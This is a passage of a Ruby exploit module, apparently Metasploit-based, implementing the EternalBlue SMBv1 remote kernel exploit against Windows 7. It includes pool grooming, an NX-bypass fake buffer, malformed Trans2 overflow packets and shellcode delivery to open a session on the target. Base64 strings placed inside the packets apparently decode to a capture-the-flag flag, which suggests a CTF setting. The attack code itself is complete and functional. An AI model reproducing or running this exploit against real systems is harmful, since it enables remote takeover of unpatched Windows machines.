      recv_pkt = RubySMB::SMB1::Packet::SessionSetupResponse.read(client.send_recv(sess_pkt))

      if recv_pkt.status_code.value == 0
        print_good('SMB1 session setup allocate nonpaged pool success')
        return client, sock
      end
      client.disconnect!
    end

    print_error("SMB1 session setup allocate nonpaged pool failed: #{recv_pkt.status_code.name}\n#{recv_pkt.status_code.description}")
    return nil
  end

  def generate_fea_list_nx
    # fea_list for disabling NX is possible because we just want to change only MDL.MappedSystemVa
    # PTE of 0xffffffffffd00000 is at 0xfffff6ffffffe800
    # NX bit is at PTE_ADDR+7
    # MappedSystemVa = PTE_ADDR+7 - 0x7f
    shellcode_page_addr = (TARGET_HAL_HEAP_ADDR + 0x400) & 0xfffffffffffff000
    pte_addr = 0xfffff6ffffffe800 + 8 * ((shellcode_page_addr - 0xffffffffffd00000) >> 12)
    fake_srv_net_buffer_x64nx = "\x00" * 16
    fake_srv_net_buffer_x64nx += [0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR].pack('SSIQ<')
    fake_srv_net_buffer_x64nx += "\x00" * 16
    fake_srv_net_buffer_x64nx += "\x00" * 16
    fake_srv_net_buffer_x64nx += [0, 0].pack('QQ<')
    fake_srv_net_buffer_x64nx += [0, TARGET_HAL_HEAP_ADDR].pack('QQ<') # _, _, pointer to fake struct
    fake_srv_net_buffer_x64nx += [0, 0,].pack('QQ<')
    fake_srv_net_buffer_x64nx += "\x00" * 16
    fake_srv_net_buffer_x64nx += "\x00" * 16
    fake_srv_net_buffer_x64nx += [0, 0x60, 0x1004, 0].pack('QSSI<') # MDL.Next, MDL.Size, MDL.MdlFlags
    fake_srv_net_buffer_x64nx += [0, pte_addr + 7 - 0x7f].pack('QQ<') # MDL.Process, MDL.MappedSystemVa

    fea_list_nx = [0x10000].pack('I<')
    fea_list_nx += NTFEA_9000
    fea_list_nx += [0, 0, fake_srv_net_buffer_x64nx.length - 1].pack('CCS<') + fake_srv_net_buffer_x64nx # -1 because first '\x00' is for name
    # stop copying by invalid flag (can be any value except 0 and 0x80)
    fea_list_nx += [0x12, 0x34, 0x5678].pack('CCS<')

    fea_list_nx
  end

  def default_session_setup_request
    p = RubySMB::SMB1::Packet::SessionSetupRequest.new
    p.parameter_block.max_buffer_size = 61440
    p.parameter_block.max_mpx_count = 50
    p.smb_header.flags2.extended_security = 1

    p
  end

  # Returns the value to be passed to SMB clients for
  # the password. If the user has not supplied a password
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the password value
  def smb_pass
    if datastore['SMBPass'].present?
      datastore['SMBPass']
    else
      ''
    end
  end

  # Returns the value to be passed to SMB clients for
  # the username. If the user has not supplied a username
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the username value
  def smb_user
    if datastore['SMBUser'].present?
      datastore['SMBUser']
    else
      ''
    end
  end

  # Returns the value to be passed to SMB clients for
  # the domain. If the user has not supplied a domain
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the domain value
  def smb_domain
    if datastore['SMBDomain'].present?
      datastore['SMBDomain']
    else
      ''
    end
  end

  class SessionSetupSMB1RequestWithPoorlyFormedDataBlock < RubySMB::GenericPacket
    COMMAND = RubySMB::SMB1::Commands::SMB_COM_SESSION_SETUP_ANDX

    class ParameterBlock < RubySMB::SMB1::Packet::SessionSetupRequest::ParameterBlock
    end

    class DataBlock < RubySMB::SMB1::DataBlock
      # Key difference for this class is that the length of security_blob is NOT dictated by the value of
      # security_blob_length in the +SessionSetupRequest::ParameterBlock+
      string :security_blob, label: 'Security Blob (GSS-API)'
      string :native_os, label: 'Native OS'
      string :native_lan_man, label: 'Native LAN Manager'
    end

    smb_header :smb_header
    parameter_block :parameter_block
    data_block :data_block
  end

  class CustomSessionSetupPacketRubySMBClient < ::RubySMB::Client
    def send_recv(packet, encrypt: false)
      version = packet.packet_smb_version
      case version
      when 'SMB1'
        packet.smb_header.uid = user_id if user_id
        packet.smb_header.pid_low = pid if pid && packet.smb_header.pid_low == 0
        packet = smb1_sign(packet)
      when 'SMB2'
        packet = increment_smb_message_id(packet)
        packet.smb2_header.session_id = session_id
        unless packet.is_a?(RubySMB::SMB2::Packet::SessionSetupRequest)
          if smb2
            packet = smb2_sign(packet)
          elsif smb3
            packet = smb3_sign(packet)
          end
        end
      end

      encrypt_data = false
      if can_be_encrypted?(packet) && encryption_supported? && (@session_encrypt_data || encrypt)
        encrypt_data = true
      end
      send_packet(packet, encrypt: encrypt_data)
      raw_response = recv_packet(encrypt: encrypt_data)
      smb2_header = nil
      unless version == 'SMB1'
        loop do
          smb2_header = RubySMB::SMB2::SMB2Header.read(raw_response)
          break unless is_status_pending?(smb2_header)

          sleep 1
          raw_response = recv_packet(encrypt: encrypt_data)
        rescue IOError
          # We're expecting an SMB2 packet, but the server sent an SMB1 packet
          # instead. This behavior has been observed with older versions of Samba
          # when something goes wrong on the server side. So, we just ignore it
          # and expect the caller to handle this wrong response packet.
          break
        end
      end

      self.sequence_counter += 1 if signing_required && !session_key.empty?
      # update the SMB2 message ID according to the received Credit Charged
      self.smb2_message_id += smb2_header.credit_charge - 1 if smb2_header && server_supports_multi_credit
      raw_response
    end

    def login(username: self.username, password: self.password,
              domain: self.domain, local_workstation: self.local_workstation,
              ntlm_flags: default_flags,
              session_setup_packet: nil,
              session_setup_auth_packet: nil)

      negotiate
      session_setup(username, password, domain,
                    local_workstation: local_workstation,
                    ntlm_flags: ntlm_flags,
                    session_setup_packet: session_setup_packet,
                    session_setup_auth_packet: session_setup_auth_packet)
    end

    def session_setup(user, pass, domain,
                      local_workstation: self.local_workstation, ntlm_flags: default_flags,
                      session_setup_packet: nil, session_setup_auth_packet: nil)
      @domain = domain
      @local_workstation = local_workstation
      @password = pass.encode('utf-8') || ''.encode('utf-8')
      @username = user.encode('utf-8') || ''.encode('utf-8')

      @ntlm_client = Net::NTLM::Client.new(
        @username,
        @password,
        workstation: @local_workstation,
        domain: @domain,
        flags: ntlm_flags
      )

      authenticate(smb1_setup_pkt: session_setup_packet, smb1_setup_auth_pkt: session_setup_auth_packet)
    end

    def authenticate(smb1_setup_pkt: nil, smb1_setup_auth_pkt: nil)
      if smb1
        if username.empty? && password.empty?
          smb1_authenticate(session_setup_packet: smb1_setup_pkt,
                            session_setup_auth_packet: smb1_setup_auth_pkt,
                            anonymous: true)
        else
          smb1_authenticate(session_setup_packet: smb1_setup_pkt,
                            session_setup_auth_packet: smb1_setup_auth_pkt)
        end
      else
        smb2_authenticate
      end
    end

    def smb1_authenticate(session_setup_packet: nil, session_setup_auth_packet: nil, anonymous: false)
      response = smb1_ntlmssp_negotiate(session_setup_packet: session_setup_packet)
      challenge_packet = smb1_ntlmssp_challenge_packet(response)

      # Store the available OS information before going forward.
      @peer_native_os = challenge_packet.data_block.native_os.to_s
      @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s
      user_id = challenge_packet.smb_header.uid
      type2_b64_message = smb1_type2_message(challenge_packet)
      type3_message = @ntlm_client.init_context(type2_b64_message)

      if anonymous
        type3_message.ntlm_response = ''
        type3_message.lm_response = ''
      end

      @session_key = @ntlm_client.session_key
      challenge_message = @ntlm_client.session.challenge_message
      store_target_info(challenge_message.target_info) if challenge_message.has_flag?(:TARGET_INFO)
      @os_version = extract_os_version(challenge_message.os_version.to_s) unless challenge_message.os_version.empty?

      raw = smb1_ntlmssp_authenticate(type3_message, user_id, session_setup_packet: session_setup_auth_packet)
      response = smb1_ntlmssp_final_packet(raw)
      response_code = response.status_code

      @user_id = user_id if response_code == ::WindowsError::NTStatus::STATUS_SUCCESS
      response_code
    end

    def smb1_ntlmssp_negotiate(session_setup_packet: nil)
      packet = smb1_ntlmssp_negotiate_packet(session_setup_packet: session_setup_packet)
      send_recv(packet)
    end

    def smb1_ntlmssp_authenticate(type3_message, user_id, session_setup_packet: nil)
      packet = smb1_ntlmssp_auth_packet(type3_message, user_id, session_setup_packet: session_setup_packet)
      send_recv(packet)
    end

    def smb1_ntlmssp_auth_packet(type3_message, user_id, session_setup_packet: nil)
      if session_setup_packet.nil?
        packet = RubySMB::SMB1::Packet::SessionSetupRequest.new
        packet.smb_header.uid = user_id
        packet.set_type3_blob(type3_message.serialize)
        packet.parameter_block.max_mpx_count = 50
        packet.smb_header.flags2.extended_security = 1

        packet
      else
        if session_setup_packet.data_block.security_blob.empty?
          session_setup_packet.set_type3_blob(type3_message.serialize)
        end
        if session_setup_packet.smb_header.uid == 0
          session_setup_packet.smb_header.uid = user_id
        end
        if session_setup_packet.parameter_block.max_buffer_size == 0
          session_setup_packet.parameter_block.max_buffer_size = max_buffer_size
        end
        if session_setup_packet.smb_header.pid_low == 0
          session_setup_packet.smb_header.pid_low = pid
        end

        session_setup_packet
      end
    end

    def smb1_ntlmssp_negotiate_packet(session_setup_packet: nil)
      type1_message = ntlm_client.init_context

      if session_setup_packet.nil?
        packet = RubySMB::SMB1::Packet::SessionSetupRequest.new unless session_setup_packet
        packet.set_type1_blob(type1_message.serialize)
        packet.parameter_block.max_mpx_count = 50
        packet.smb_header.flags2.extended_security = 1

        packet
      else
        if session_setup_packet.data_block.security_blob.empty?
          session_setup_packet.set_type1_blob(type1_message.serialize)
        end

        session_setup_packet
      end
    end
  end
end

module EternalBlueWin7
  require 'ruby_smb'
  require 'ruby_smb/smb1/packet'
  require 'windows_error'

  include Msf::Exploit::Remote::DCERPC

  class EternalBlueError < StandardError
  end

  def exploit_eb
    begin
      for i in 1..datastore['MaxExploitAttempts']
        grooms = datastore['GroomAllocations'] + datastore['GroomDelta'] * (i - 1)
        smb_eternalblue(datastore['ProcessName'], grooms)

        # we don't need this sleep, and need to find a way to remove it
        # problem is session_count won't increment until stage is complete :\
        secs = 0
        while !session_created? && (secs < 30)
          secs += 1
          sleep 1
        end

        if session_created?
          print_good('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
          print_good('=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
          print_good('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
          break
        else
          print_bad('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
          print_bad('=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
          print_bad('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
        end
      end
    rescue EternalBlueError => e
      print_error(e.message.to_s)
      return false
    rescue ::RubySMB::Error::NegotiationFailure
      print_error('SMB Negotiation Failure -- this often occurs when lsass crashes.  The target may reboot in 60 seconds.')
      return false
    rescue ::RubySMB::Error::UnexpectedStatusCode,
           ::Errno::ECONNRESET,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionRefused,
           ::RubySMB::Error::CommunicationError => e
      print_error("#{e.class}: #{e.message}")
      report_failure
      return false
    rescue StandardError => e
      print_error(e.class.to_s)
      print_error(e.message)
      print_error(e.backtrace.join("\n"))
      return false
    end
  end

  def smb_eternalblue(process_name, grooms)
    begin
      # Step 0: pre-calculate what we can
      shellcode = make_kernel_user_payload(payload.encoded, process_name)
      payload_hdr_pkt = make_smb2_payload_headers_packet
      payload_body_pkt = make_smb2_payload_body_packet(shellcode)

      # Step 1: Connect to IPC$ share
      print_status('Connecting to target for exploitation.')
      client, tree, sock, os = smb1_anonymous_connect_ipc
    rescue RubySMB::Error::CommunicationError
      # Error handler in case SMBv1 disabled on target
      raise EternalBlueError, 'Could not make SMBv1 connection'
    else
      print_good('Connection established for exploitation.')

      if verify_target(os)
        print_good('Target OS selected valid for OS indicated by SMB reply')
      else
        print_warning('Target OS selected not valid for OS indicated by SMB reply')
        print_warning('Disable VerifyTarget option to proceed manually...')
        raise EternalBlueError, 'Unable to continue with improper OS Target.'
      end

      # cool buffer print no matter what, will be helpful when people post debug issues
      print_core_buffer(os)

      if verify_arch
        print_good('Target arch selected valid for arch indicated by DCE/RPC reply')
      else
        print_warning('Target arch selected not valid for arch indicated by DCE/RPC reply')
        print_warning('Disable VerifyArch option to proceed manually...')
        raise EternalBlueError, 'Unable to continue with improper OS Arch.'
      end

      print_status("Trying exploit with #{grooms} Groom Allocations.")

      # Step 2: Create a large SMB1 buffer
      print_status('Sending all but last fragment of exploit packet')
      smb1_large_buffer(client, tree, sock)

      # Step 3: Groom the pool with payload packets, and open/close SMB1 packets
      print_status('Starting non-paged pool grooming')

      # initialize_groom_threads(ip, port, payload, grooms)
      fhs_sock = smb1_free_hole(true)

      @groom_socks = []

      print_good('Sending SMBv2 buffers')
      smb2_grooms(grooms, payload_hdr_pkt)

      fhf_sock = smb1_free_hole(false)

      print_good('Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.')
      fhs_sock.shutdown

      print_status('Sending final SMBv2 buffers.') # 6x
      smb2_grooms(6, payload_hdr_pkt) # TODO: magic #

      fhf_sock.shutdown

      print_status('Sending last fragment of exploit packet!')
      final_exploit_pkt = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_exploit, 15)
      sock.put(final_exploit_pkt)

      print_status('Receiving response from exploit packet')
      code, _raw = smb1_get_response(sock)

      code_str = '0x' + code.to_i.to_s(16).upcase
      if code.nil?
        print_error('Did not receive a response from exploit packet')
      elsif code == 0xc000000d # STATUS_INVALID_PARAMETER (0xC000000D)
        print_good("ETERNALBLUE overwrite completed successfully (#{code_str})!")
      else
        print_warning("ETERNALBLUE overwrite returned unexpected status code (#{code_str})!")
      end

      # Step 4: Send the payload
      print_status('Sending egg to corrupted connection.')

      @groom_socks.each { |gsock| gsock.put(payload_body_pkt.first(2920)) }
      @groom_socks.each { |gsock| gsock.put(payload_body_pkt[2920..(4204 - 0x84)]) }

      print_status('Triggering free of corrupted buffer.')
      # tree disconnect
      # logoff and x
      # note: these aren't necessary, just close the sockets
      return true
    ensure
      abort_sockets
    end
  end

  def verify_target(os)
    os = os.gsub("\x00", '') # strip unicode bs
    os << "\x00" # but original has a null
    ret = true

    if datastore['VerifyTarget']
      ret = false
      # search if its in patterns
      target['os_patterns'].each do |pattern|
        if os.downcase.include? pattern.downcase
          ret = true
          break
        end
      end
    end

    return ret
  end

  def verify_arch
    return true unless datastore['VerifyArch']

    # XXX: This sends a new DCE/RPC packet
    arch = dcerpc_getarch

    return true if arch && arch == target_arch.first

    print_warning("Target arch is #{target_arch.first}, but server returned #{arch.inspect}")
    print_warning('The DCE/RPC service or probe may be blocked') if arch.nil?
    false
  end

  def print_core_buffer(os)
    print_status("CORE raw buffer dump (#{os.length} bytes)")

    count = 0
    chunks = os.scan(/.{1,16}/)
    chunks.each do |chunk|
      hexdump = chunk.chars.map { |ch| ch.ord.to_s(16).rjust(2, '0') }.join(' ')

      format = format('0x%08x  %-47s  %-16s', (count * 16), hexdump, chunk)
      print_status(format)
      count += 1
    end
  end

  def smb2_grooms(grooms, payload_hdr_pkt)
    grooms.times do |_groom_id|
      gsock = connect(false)
      @groom_socks << gsock
      gsock.put(payload_hdr_pkt)
    end
  end

  def smb1_anonymous_connect_ipc
    sock = connect(false)
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, smb3: false, username: smb_user, domain: smb_domain, password: smb_pass)
    client.pid = nil
    response_code = client.login

    unless response_code == ::WindowsError::NTStatus::STATUS_SUCCESS
      raise RubySMB::Error::UnexpectedStatusCode, "Error with login: #{response_code}"
    end

    os = client.peer_native_os

    tree = client.tree_connect("\\\\#{datastore['RHOST']}\\IPC$")

    return client, tree, sock, os
  end

  def smb1_large_buffer(client, tree, sock)
    nt_trans_pkt = make_smb1_nt_trans_packet(tree.id, client.user_id)

    # send NT Trans
    vprint_status('Sending NT Trans Request packet')

    client.send_recv(nt_trans_pkt)
    # Initial Trans2  request
    trans2_pkt_nulled = make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_zero, 0)

    # send all but last packet
    for i in 1..14
      trans2_pkt_nulled << make_smb1_trans2_exploit_packet(tree.id, client.user_id, :eb_trans2_buffer, i)
    end

    vprint_status('Sending malformed Trans2 packets')
    sock.put(trans2_pkt_nulled)

    begin
      sock.get_once
    rescue EOFError
      vprint_error('No response back from SMB echo request.  Continuing anyway...')
    end

    client.echo(count: 1, data: "d2N0ZntsM3RTXw==")
  end

  def smb1_free_hole(start)
    sock = connect(false)
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)
    client = RubySMB::Client.new(dispatcher, smb1: true, smb2: false, smb3: false, username: smb_user, domain: smb_domain, password: smb_pass)
    client.pid = nil
    client.negotiate

    pkt = ''

    if start
      vprint_status('Sending start free hole packet.')
      pkt = make_smb1_free_hole_session_packet("\x07\xc0", "\x2d\x01", "\xf0\xff\x00\x00\x00")
    else
      vprint_status('Sending end free hole packet.')
      pkt = make_smb1_free_hole_session_packet("\x07\x40", "\x2c\x01", "\xf8\x87\x00\x00\x00")
    end

    client.send_recv(pkt)
    sock
  end

  def smb1_get_response(sock)
    raw = nil

    # dirty hack since it doesn't always like to reply the first time...
    16.times do
      raw = sock.get_once
      break unless raw.nil? || raw.empty?
    end

    return nil unless raw

    response = RubySMB::SMB1::SMBHeader.read(raw[4..-1])
    code = response.nt_status
    return code, raw, response
  end

  def make_smb2_payload_headers_packet
    # don't need a library here, the packet is essentially nonsensical
    pkt = ''
    pkt << "\x00" # session message
    pkt << "\x00\xff\xf7" # size
    pkt << "\xfeSMB" # SMB2
    pkt << "\x00" * 124

    pkt
  end

  def make_smb2_payload_body_packet(kernel_user_payload)
    # precalculated lengths
    pkt_max_len = 4204
    pkt_setup_len = 497
    pkt_max_payload = pkt_max_len - pkt_setup_len # 3575

    # this packet holds padding, KI_USER_SHARED_DATA addresses, and shellcode
    pkt = ''

    # padding
    pkt << "\x00" * 0x8
    pkt << "\x03\x00\x00\x00"
    pkt << "\x00" * 0x1c
    pkt << "\x03\x00\x00\x00"
    pkt << "\x00" * 0x74

    # KI_USER_SHARED_DATA addresses
    pkt << "\xb0\x00\xd0\xff\xff\xff\xff\xff" * 2 # x64 address
    pkt << "\x00" * 0x10
    pkt << "\xc0\xf0\xdf\xff" * 2 # x86 address
    pkt << "\x00" * 0xc4

    # payload addreses
    pkt << "\x90\xf1\xdf\xff"
    pkt << "\x00" * 0x4
    pkt << "\xf0\xf1\xdf\xff"
    pkt << "\x00" * 0x40

    pkt << "\xf0\x01\xd0\xff\xff\xff\xff\xff"
    pkt << "\x00" * 0x8
    pkt << "\x00\x02\xd0\xff\xff\xff\xff\xff"
    pkt << "\x00"

    pkt << kernel_user_payload

    # fill out the rest, this can be randomly generated
    pkt << "\x00" * (pkt_max_payload - kernel_user_payload.length)

    pkt
  end

  # Type can be :eb_trans2_zero, :eb_trans2_buffer, or :eb_trans2_exploit
  def make_smb1_trans2_exploit_packet(tree_id, user_id, type, timeout)
    timeout = (timeout * 0x10) + 3
    timeout_value = "\x35\x00\xd0" + timeout.chr

    packet = RubySMB::SMB1::Packet::Trans2::Request.new
    packet = set_smb1_headers(packet, tree_id, user_id)

    # The packets are labeled as Secondary Requests but are actually structured
    # as normal Trans2 Requests for some reason. We shall similarly cheat here.
    packet.smb_header.command = RubySMB::SMB1::Commands::SMB_COM_TRANSACTION2_SECONDARY

    packet.parameter_block.flags.read("\x00\x10")
    packet.parameter_block.timeout.read(timeout_value)

    packet.parameter_block.word_count = 9
    packet.parameter_block.total_data_count = 4096
    packet.parameter_block.parameter_count = 4096

    nbss = "\x00\x00\x10\x35"
    pkt = packet.to_binary_s
    pkt = pkt[0, packet.parameter_block.parameter_offset.abs_offset]
    pkt = nbss + pkt

    case type
    when :eb_trans2_exploit
      vprint_status('Making :eb_trans2_exploit packet')
      
      pkt << "\x41" * 2957

      pkt << "\x80\x00\xa8\x00" # overflow

      pkt << "\x00" * 0x10
      pkt << "\xff\xff"
      pkt << "\x00" * 0x6
      pkt << "\xff\xff"
      pkt << "\x00" * 0x16

      pkt << "\x00\xf1\xdf\xff" # x86 addresses
      pkt << "\x00" * 0x8
      pkt << "\x20\xf0\xdf\xff"

      pkt << "\x00\xf1\xdf\xff\xff\xff\xff\xff" # x64

      pkt << "\x60\x00\x04\x10"
      pkt << "\x00" * 4

      pkt << "\x80\xef\xdf\xff"

      pkt << "\x00" * 4
      pkt << "\x10\x00\xd0\xff\xff\xff\xff\xff"
      pkt << "\x18\x01\xd0\xff\xff\xff\xff\xff"
      pkt << "\x00" * 0x10

      pkt << "\x60\x00\x04\x10"
      pkt << "\x00" * 0xc
      pkt << "\x90\xff\xcf\xff\xff\xff\xff\xff"
      pkt << "\x00" * 0x8
      pkt << "\x80\x10"
      pkt << "\x00" * 0xe
      pkt << "\x39"
      pkt << "\xbb"

      pkt << "\x41" * 60
      pkt << "\x41" * 16
      pkt << "\x41" * 100
      pkt << "M3RlUm40bEx5X2cwXw=="
      pkt << "\x41" * 500
      pkt << "YkxVM183bjl3bTRpV25MfQ=="
      pkt << "\x41" * 245
    when :eb_trans2_zero
      vprint_status('Making :eb_trans2_zero packet')
      pkt << "\x00" * 2055
      pkt << "\x83\xf3"
      pkt << "\x41" * 2039
    else
      vprint_status('Making :eb_trans2_buffer packet')
      pkt << "\x41" * 4096
    end
    pkt
  end

  def make_smb1_nt_trans_packet(tree_id, user_id)
    packet = RubySMB::SMB1::Packet::NtTrans::Request.new

    # Disable the automatic padding because it will distort
    # our values here.
    packet.data_block.enable_padding = false

    packet = set_smb1_headers(packet, tree_id, user_id)

    packet.parameter_block.max_setup_count = 1
    packet.parameter_block.total_parameter_count = 30
    packet.parameter_block.total_data_count = 66512
    packet.parameter_block.max_parameter_count = 30
    packet.parameter_block.max_data_count = 0
    packet.parameter_block.parameter_count = 30
    packet.parameter_block.parameter_offset = 75
    packet.parameter_block.data_count = 976
    packet.parameter_block.data_offset = 104
    packet.parameter_block.function = 0

    packet.parameter_block.setup << 0x0000

    packet.data_block.byte_count = 1004
    packet.data_block.trans2_parameters = "\x00" * 31 + "\x01" + ("\x00" * 973)
    packet
  end

  def make_smb1_free_hole_session_packet(flags2, vcnum, native_os)
    packet = RubySMB::SMB1::Packet::SessionSetupRequest.new

    packet.smb_header.flags.read("\x18")
    packet.smb_header.flags2.read(flags2)
    packet.smb_header.pid_high = 65279
    packet.smb_header.mid = 64

    packet.parameter_block.vc_number.read(vcnum)
    packet.parameter_block.max_buffer_size = 4356
    packet.parameter_block.max_mpx_count = 10
    packet.parameter_block.security_blob_length = 0

    packet.smb_header.flags2.unicode = 0
    packet.data_block.security_blob = native_os + "\x00" * 15
    packet.data_block.native_os = ''
    packet.data_block.native_lan_man = ''
    packet
  end

  # Sets common SMB1 Header values used by the various
  # packets in the exploit.
  #
  # @return [RubySMB::GenericPacket] the modified version of the packet
  def set_smb1_headers(packet, tree_id, user_id)
    packet.smb_header.flags2.read("\x07\xc0")
    packet.smb_header.tid = tree_id
    packet.smb_header.uid = user_id
    packet.smb_header.pid_low = 65279
    packet.smb_header.mid = 64
    packet
  end

  # Returns the value to be passed to SMB clients for
  # the password. If the user has not supplied a password
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the password value
  def smb_pass
    if datastore['SMBPass'].present?
      datastore['SMBPass']
    else
      ''
    end
  end

  # Returns the value to be passed to SMB clients for
  # the username. If the user has not supplied a username
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the username value
  def smb_user
    if datastore['SMBUser'].present?
      datastore['SMBUser']
    else
      ''
    end
  end

  # Returns the value to be passed to SMB clients for
  # the domain. If the user has not supplied a domain
  # it returns an empty string to trigger an anonymous
  # logon.
  #
  # @return [String] the domain value
  def smb_domain
    if datastore['SMBDomain'].present?
      datastore['SMBDomain']
    else
      ''
    end
  end
end
